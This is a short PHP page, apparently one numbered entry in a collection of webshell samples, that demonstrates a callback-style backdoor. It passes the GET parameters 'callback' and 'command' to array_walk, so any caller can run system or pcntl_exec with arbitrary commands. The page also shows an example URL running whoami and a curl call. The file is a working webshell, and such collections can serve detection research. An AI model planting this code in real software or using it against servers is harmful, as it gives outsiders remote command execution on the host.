<?php
	$linux = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?callback=system&amp;command=whoami'
?>

<html>
<head>
	<meta charset="UTF-8"/>
	<title>013 - WebShell - array_walk 回调方式</title>
</head>
<body>
	<h1>013 - WebShell - 回调类型后门 - array_walk</h1>

<p>不正常调用: </p>
<p>curl '<a href="<?php echo $linux ?>" target="_blank"><?php echo $linux ?></a>'</p>
<p>Please make sure enable PCNTL extension while callback=pcntl_exec (php -i | grep pcntl)</p>
<br>
<br>
<?php
if (isset($_GET['callback']) && isset($_GET['command'])) {
    $items = array($_GET['command'], "placeholder");
    array_walk($items, $_GET['callback']);
}
?>
</body>
</html>
